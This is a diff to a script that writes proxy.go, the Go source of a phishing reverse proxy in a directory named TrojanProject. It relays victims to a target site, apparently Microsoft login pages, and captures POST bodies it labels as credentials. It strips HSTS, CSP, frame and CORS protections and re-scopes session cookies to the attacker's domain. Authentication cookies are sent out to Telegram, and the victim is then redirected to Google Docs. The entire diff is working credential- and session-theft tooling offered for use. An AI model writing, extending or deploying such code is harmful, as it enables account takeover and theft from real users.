@@ -100,23 +100,31 @@ func main() {
 EOF
 
 # B. proxy.go (Cookie Re-Scoper & Header Spoofing)
+# B. proxy.go (Enhanced with HSTS, CORS & Recursive Header/Cookie Re‑scoping)
 cat << 'EOF' > /root/TrojanProject/proxy.go
 package main
+
 import (
 	"bytes"
+	"fmt"
 	"io"
 	"net/http"
 	"net/http/httputil"
 	"net/url"
 	"strings"
-	"fmt"
 )
+
+// Helper: recursively rewrite any header value containing the original domain
+func rewriteHeaderValue(value, oldDomain, newDomain string) string {
+	return strings.ReplaceAll(value, oldDomain, newDomain)
+}
+
 func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	remote, _ := url.Parse("https://" + t.BaseDomain)
 	proxy := httputil.NewSingleHostReverseProxy(remote)
-	myHost := r.Host 
+	myHost := r.Host
 
-	// 🛡️ HEADER SPOOFING: Strip Origin/Referer to bypass security checks
+	// --- Request modifications ---
 	r.Host = remote.Host
 	r.URL.Host = remote.Host
 	r.URL.Scheme = remote.Scheme
@@ -124,6 +132,7 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	r.Header.Del("Referer")
 	r.Header.Set("X-Forwarded-Host", myHost)
 
+	// Capture POST bodies (credentials)
 	if r.Method == "POST" {
 		body, _ := io.ReadAll(r.Body)
 		r.Body = io.NopCloser(bytes.NewBuffer(body))
@@ -134,7 +143,33 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 	}
 
 	proxy.ModifyResponse = func(resp *http.Response) error {
-		// 1. RE-SCOPE COOKIES: Force browser to accept them for YOUR domain
+		// --- 1. HSTS removal ---
+		resp.Header.Del("Strict-Transport-Security")
+
+		// --- 2. CORS handling ---
+		if acao := resp.Header.Get("Access-Control-Allow-Origin"); acao != "" {
+			resp.Header.Set("Access-Control-Allow-Origin", "https://"+myHost)
+		}
+		resp.Header.Del("Access-Control-Allow-Credentials")
+		resp.Header.Del("Access-Control-Allow-Methods")
+		resp.Header.Del("Access-Control-Allow-Headers")
+
+		// --- 3. Recursive header rewriting (any header containing original domain) ---
+		for header, values := range resp.Header {
+			for i, v := range values {
+				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
+					resp.Header[header][i] = rewriteHeaderValue(v, t.BaseDomain, myHost)
+				}
+			}
+		}
+
+		// --- 4. Security headers removal (to avoid breaking the page) ---
+		resp.Header.Del("Content-Security-Policy")
+		resp.Header.Del("X-Frame-Options")
+		resp.Header.Del("Feature-Policy")
+		resp.Header.Del("Referrer-Policy")
+
+		// --- 5. Cookie re‑scoping (with Secure/SameSite handling) ---
 		oldCookies := resp.Cookies()
 		resp.Header.Del("Set-Cookie")
 		for _, c := range oldCookies {
@@ -145,33 +180,22 @@ func ProxyTarget(t *Target, w http.ResponseWriter, r *http.Request) {
 				if strings.Contains(c.Name, auth) {
 					SendToTelegram(fmt.Sprintf("🎯 [%s] SUCCESS! %s=%s", t.Name, c.Name, c.Value))
 					resp.Header.Set("Location", "https://www.google.com/docs/about/")
-					resp.StatusCode = 302
+					resp.StatusCode = http.StatusFound // 302
+					return nil
 				}
 			}
 		}
 
-		// 2. HEADER SWEEP
-		for header, values := range resp.Header {
-			for i, v := range values {
-				if strings.Contains(strings.ToLower(v), strings.ToLower(t.BaseDomain)) {
-					resp.Header[header][i] = strings.ReplaceAll(v, t.BaseDomain, myHost)
-				}
-			}
-		}
-
-		resp.Header.Del("Content-Security-Policy")
-		resp.Header.Del("X-Frame-Options")
-
-		// 3. BODY REWRITE & CONTENT-LENGTH VALIDATOR
+		// --- 6. Body rewriting (recursive domain replacement) ---
 		contentType := resp.Header.Get("Content-Type")
 		if strings.Contains(contentType, "text") || strings.Contains(contentType, "javascript") || strings.Contains(contentType, "json") {
 			oldBody, _ := io.ReadAll(resp.Body)
 			bodyStr := string(oldBody)
-			
+
 			newContent := strings.ReplaceAll(bodyStr, t.BaseDomain, myHost)
 			newContent = strings.ReplaceAll(newContent, "login.microsoftonline.com", myHost)
 			newContent = strings.ReplaceAll(newContent, "login.live.com", myHost)
-			
+
 			bodyBytes := []byte(newContent)
 			resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
 			resp.ContentLength = int64(len(bodyBytes))
